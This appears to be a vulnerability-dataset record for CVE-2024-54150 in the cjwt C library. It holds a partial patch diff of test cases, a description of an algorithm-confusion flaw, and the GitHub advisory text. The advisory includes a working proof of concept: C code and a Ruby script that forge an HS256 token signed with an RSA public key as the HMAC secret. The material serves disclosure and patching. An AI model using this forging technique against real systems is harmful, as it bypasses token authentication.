\"ES512 invalid\",     \"es512.jwt\",   \"es256.jwt.pub\", NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"ES256 NULL secret\", \"es256.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-    { \"ES384 NULL secret\", \"es384.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-    { \"ES512 NULL secret\", \"es512.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"HS256 bad secret\",  \"hs256.jwt\",   NULL,            \"hs000-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"HS384 bad secret\",  \"hs384.jwt\",   NULL,            \"hs000-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"HS512 bad secret\",  \"hs512.jwt\",   NULL,            \"hs000-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"HS256 NULL secret\", \"hs256.jwt\",   NULL,            NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"HS384 NULL secret\", \"hs384.jwt\",   NULL,            NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"HS512 NULL secret\", \"hs512.jwt\",   NULL,            NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"HS256 not allowed\", \"hs256.jwt\",   NULL,            \"hs256-secret\", 0,                     CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"HS384 not allowed\", \"hs384.jwt\",   NULL,            \"hs384-secret\", 0,                     CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"HS512 not allowed\", \"hs512.jwt\",   NULL,            \"hs512-secret\", 0,                     CJWTE_HEADER_UNSUPPORTED_ALG      },\n+\n+    { \"RS256 bad secret\",  \"rs256.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"RS384 bad secret\",  \"rs384.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"RS512 bad secret\",  \"rs512.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"RS256 partial\",     \"rs256.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"RS384 partial\",     \"rs384.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"RS512 partial\",     \"rs512.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"RS256 invalid\",     \"rs256.jwt\",   \"es256.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"RS384 invalid\",     \"rs384.jwt\",   \"es256.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"RS512 invalid\",     \"rs512.jwt\",   \"es256.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"RS256 NULL secret\", \"rs256.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"RS384 NULL secret\", \"rs384.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"RS512 NULL secret\", \"rs512.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"RS256 not allowed\", \"rs256.jwt\",   \"rs.pub\",        NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"RS384 not allowed\", \"rs384.jwt\",   \"rs.pub\",        NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"RS512 not allowed\", \"rs512.jwt\",   \"rs.pub\",        NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+\n+    { \"PS256 bad secret\",  \"ps256.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"PS384 bad secret\",  \"ps384.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"PS512 bad secret\",  \"ps512.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"PS256 partial\",     \"ps256.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"PS384 partial\",     \"ps384.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"PS512 partial\",     \"ps512.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"PS256 invalid\",     \"ps256.jwt\",   \"es256.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"PS384 invalid\",     \"ps384.jwt\",   \"es256.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"PS512 invalid\",     \"ps512.jwt\",   \"es256.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"PS256 NULL secret\", \"ps256.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"PS384 NULL secret\", \"ps384.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"PS512 NULL secret\", \"ps512.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"PS256 not allowed\", \"ps256.jwt\",   \"ps.pub\",        NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"PS384 not allowed\", \"ps384.jwt\",   \"ps.pub\",        NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"PS512 not allowed\", \"ps512.jwt\",   \"ps.pub\",        NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+\n+    { \"ES256 bad secret\",  \"es256.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"ES384 bad secret\",  \"es384.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"ES512 bad secret\",  \"es512.jwt\",   \"rs-alt.pub\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"ES256 partial\",     \"es256.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"ES384 partial\",     \"es384.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"ES512 partial\",     \"es512.jwt\",   \"rs.partial\",    NULL,           0,                     CJWTE_SIGNATURE_INVALID_KEY       },\n+    { \"ES256 invalid\",     \"es256.jwt\",   \"es512.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"ES384 invalid\",     \"es384.jwt\",   \"es512.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"ES512 invalid\",     \"es512.jwt\",   \"es256.jwt.pub\", NULL,           0,                     CJWTE_SIGNATURE_VALIDATION_FAILED },\n+    { \"ES256 NULL secret\", \"es256.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"ES384 NULL secret\", \"es384.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"ES512 NULL secret\", \"es512.jwt\",   NULL,            NULL,           0,                     CJWTE_SIGNATURE_MISSING_KEY       },\n+    { \"ES256 not allowed\", \"es256.jwt\",   \"es256.jwt.pub\", NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"ES384 not allowed\", \"es384.jwt\",   \"es384.jwt.pub\", NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n+    { \"ES512 not allowed\", \"es512.jwt\",   \"es512.jwt.pub\", NULL,           OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_UNSUPPORTED_ALG      },\n \n     /* These are some nefarious focused tests */\n-    { \"Try 5 section\",     \"try_5.inv\",   NULL,            \"hs256-secret\", CJWTE_INVALID_SECTIONS            },\n-    { \"Try 4 section\",     \"try_4.inv\",   NULL,            \"hs256-secret\", CJWTE_INVALID_SECTIONS            },\n-    { \"Try 2 section\",     \"try_2.inv\",   NULL,            \"hs256-secret\", CJWTE_INVALID_SECTIONS            },\n-    { \"Try 1 section\",     \"try_1.inv\",   NULL,            \"hs256-secret\", CJWTE_HEADER_MISSING              },\n+    { \"Try 5 section\",     \"try_5.inv\",   NULL,            \"hs256-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_INVALID_SECTIONS            },\n+    { \"Try 4 section\",     \"try_4.inv\",   NULL,            \"hs256-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_INVALID_SECTIONS            },\n+    { \"Try 2 section\",     \"try_2.inv\",   NULL,            \"hs256-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_INVALID_SECTIONS            },\n+    { \"Try 1 section\",     \"try_1.inv\",   NULL,            \"hs256-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_MISSING              },\n \n-    { \"Invld b64 header\",  \"hdr_b64.inv\", NULL,            \"hs256-secret\", CJWTE_HEADER_INVALID_BASE64       },\n-    { \"Invld b64 sig\",     \"sig_b64.inv\", NULL,            \"hs256-secret\", CJWTE_SIGNATURE_INVALID_BASE64    },\n+    { \"Invld b64 header\",  \"hdr_b64.inv\", NULL,            \"hs256-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_HEADER_INVALID_BASE64       },\n+    { \"Invld b64 sig\",     \"sig_b64.inv\", NULL,            \"hs256-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_SIGNATURE_INVALID_BASE64    },\n };\n \n json_test_case_t json_test_list[] = {\n\n@@ -704,7 +717,7 @@\nvoid test_case(const test_case_t *t)\n         while (isspace(jwt_buf[jwt_bytes - 1])) {\n             jwt_bytes--;\n         }\n-        result = cjwt_decode(jwt_buf, jwt_bytes, 0, key, key_len, 0, 0, &jwt);\n+        result = cjwt_decode(jwt_buf, jwt_bytes, t->options, key, key_len, 0, 0, &jwt);\n     } else {\n         result = jwt_bytes;\n     }\n```"
            }
        ],
        "sw_version": "v2.2.0",
        "sw_version_wget": "https://github.com/xmidt-org/cjwt/archive/refs/tags/v2.2.0.zip",
        "description": "cjwt is a C JSON Web Token (JWT) Implementation. Algorithm confusion occurs when a system improperly verifies the type of signature used, allowing attackers to exploit the lack of distinction between signing methods.  If the system doesn't differentiate between an HMAC signed token and an RS/EC/PS signed token during verification, it becomes vulnerable to this kind of attack. For instance, an attacker could craft a token with the alg field set to \"HS256\" while the server expects an asymmetric algorithm like \"RS256\". The server might mistakenly use the wrong verification method, such as using a public key as the HMAC secret, leading to unauthorised access. For RSA, the key can be computed from a few signatures. For Elliptic Curve (EC), two potential keys can be recovered from one signature. This can be used to bypass the signature mechanism if an application relies on asymmetrically signed tokens. This issue has been addressed in version 2.3.0 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "sec_adv": [
            {
                "url": "https://github.com/xmidt-org/cjwt/security/advisories/GHSA-9h24-7qp5-gp82",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nxmidt-org\n/\ncjwt\nPublic\nNotifications You must be signed in to change notification settings\nFork 21\nStar 16\nCode\nIssues\n2\nPull requests\nActions\nProjects\nSecurity\n1\nInsights\nAdditional navigation options\nAlgorithm Confusion Vulnerability\nCritical schmidtw published GHSA-9h24-7qp5-gp82 on Dec 18, 2024Dec 19, 2024\nPackage\ncjwt\nAffected versions\nv2.2.0\nPatched versions\nv2.3.0\nDescription\nSummary\nI'm looking at algorithm confusion vulnerabilities across a few Github repo. It seems like your library is vulnerable to this attack.\nDetails\nAlgorithm confusion occurs when a system improperly verifies the type of signature used, allowing attackers to exploit the lack of distinction between signing methods.\nIf the system doesn't differentiate between an HMAC signed token and an RS/EC/PS signed token during verification, it becomes vulnerable to this kind of attack. For instance, an attacker could craft a token with the alg field set to \"HS256\" while the server expects an asymmetric algorithm like \"RS256\". The server might mistakenly use the wrong verification method, such as using a public key as the HMAC secret, leading to unauthorised access.\nFor RSA, the key can be computed from a few signatures. For Elliptic Curve (EC), two potential keys can be recovered from one signature.\nPoC\nThe code below illustrates the issue:\n#include <stddef.h>\n#include <stdint.h>\n#include <string.h>\n\n#include \"cjwt.h\"\nint main(void)\n{\n    cjwt_t *jwt = NULL;\n    cjwt_code_t rv;\n\n    /* the ps variant is very similar */\n    const char *rs_text =\n        /* header */\n        \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Cg.\"\n        /* payload */\n        \"eyJzdWIiOiIxMjM0NTY3ODkwIiwibGlicmFyeSI6Imh0dHBzOi8vZ2l\"\n        \"0aHViLmNvbS94bWlkdC1vcmcvY2p3dCIsImlhdCI6MTUxNjIzOTAyMn0.\"\n        /* signature */\n        \"dCJQACrMVrIMf2Jc6s2S_ABf46Csdqmqv-ZNMrTQhPM\";\n        /*\n        \"e-pFjFcKyrWa6ODgkclHe26EEF6AkI-xaW6J-Z37IdfygRKmgqy5cIz\"\n        \"hjIGBPQg2aJGrPmCc5zP-zeK1M98odo5OCxCDdfQsKTtJJlCIVC2Iv1\"\n        \"CaZDc-dTNnmjZE6PBM9fzwhXd5ESNjSxhtHSt8_9gFmogaixcxD1D7A\"\n        \"nSJ1kl-o9yVK2vBRTHfFEyx5npUGbuNGSdIcoUHQUvL3B55XhQW_IlT\"\n        \"moYUjBKAg0Mqk1HAhzQ-ZXz2C6Ptopx9ga3ccK4QmXnUHwo_bRF7eIh\"\n        \"WweMfy_JM7pNGZc1VGa0hCpp-Axwq3CZfwLL0DY7ohcSYfJN_4d4Qn7\"\n        \"2S8EHKg_E5Ng\"; */\n    const char *rs_pub_key =\n        \"-----BEGIN PUBLIC KEY-----\\n\"\n        \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnzyis1ZjfNB0bBgKFMSv\\n\"\n        \"vkTtwlvBsaJq7S5wA+kzeVOVpVWwkWdVha4s38XM/pa/yr47av7+z3VTmvDRyAHc\\n\"\n        \"aT92whREFpLv9cj5lTeJSibyr/Mrm/YtjCZVWgaOYIhwrXwKLqPr/11inWsAkfIy\\n\"\n        \"tvHWTxZYEcXLgAXFuUuaS3uF9gEiNQwzGTU1v0FqkqTBr4B8nW3HCN47XUu0t8Y0\\n\"\n        \"e+lf4s4OxQawWD79J9/5d3Ry0vbV3Am1FtGJiJvOwRsIfVChDpYStTcHTCMqtvWb\\n\"\n        \"V6L11BWkpzGXSW4Hv43qa+GSYOD2QU68Mb59oSk2OB+BtOLpJofmbGEGgvmwyCI9\\n\"\n        \"MwIDAQAB\\n\"\n        \"-----END PUBLIC KEY-----\";\n\n    rv = cjwt_decode(rs_text, strlen(rs_text), 0,\n                     (uint8_t *) rs_pub_key, strlen(rs_pub_key), 0, 0, &jwt);\n\n    if (CJWTE_OK != rv) {\n        printf(\"There was an error processing the text: %d\\n\", rv);\n        return -1;\n    }\n\n    cjwt_print(stdout, jwt);\n\n    cjwt_destroy(jwt);\n\n    return 0;\n}\nThere isn't much to see since it's just like verifying a token using HMAC but the signature is computed using HMAC of the public key.\nYou can use the following Ruby to generate a token using the public key from examples/basic/rs_example.c:\nrequire 'openssl'\nrequire 'base64'\n\nsecret_key = \"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnzyis1ZjfNB0bBgKFMSv\\nvkTtwlvBsaJq7S5wA+kzeVOVpVWwkWdVha4s38XM/pa/yr47av7+z3VTmvDRyAHc\\naT92whREFpLv9cj5lTeJSibyr/Mrm/YtjCZVWgaOYIhwrXwKLqPr/11inWsAkfIy\\ntvHWTxZYEcXLgAXFuUuaS3uF9gEiNQwzGTU1v0FqkqTBr4B8nW3HCN47XUu0t8Y0\\ne+lf4s4OxQawWD79J9/5d3Ry0vbV3Am1FtGJiJvOwRsIfVChDpYStTcHTCMqtvWb\\nV6L11BWkpzGXSW4Hv43qa+GSYOD2QU68Mb59oSk2OB+BtOLpJofmbGEGgvmwyCI9\\nMwIDAQAB\\n-----END PUBLIC KEY-----\"\n\nmessage = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Cg.eyJzdWIiOiIxMjM0NTY3ODkwIiwibGlicmFyeSI6Imh0dHBzOi8vZ2l0aHViLmNvbS94bWlkdC1vcmcvY2p3dCIsImlhdCI6MTUxNjIzOTAyMn0\"\n\nhmac = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret_key, message)\n\nsignature_base64 = Base64.urlsafe_encode64(hmac, padding: false)\n\n# Print the signature\nputs \"Signature (Base64): #{signature_base64}\"\nputs message+'.'+signature_base64\nFrom my (limited) understanding of your codebase, a good way to fix the issue would be to force people to set the allowed algorithms as part of the options. For example, by only accepting HMAC (most likely usage) by default and developers can use options to allow RS*/ES*/PS* depending on their needs.\nImpact\nThis can be used to bypass the signature mechanism if an application relies on asymmetrically signed tokens.\nSeverity\nCritical\nCVE ID\nCVE-2024-54150\nWeaknesses\nCWE-347\nCredits\nsnyff\nReporter\nFooter\nÂ© 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory explicitly contains a proof of concept (PoC) demonstrating the issue along with associated code."
            }
        ],
        "cwe": [
            {
                "id": "CWE-347",
                "value": "CWE-347: Improper Verification of Cryptographic Signature"
            }
        ]
    }
}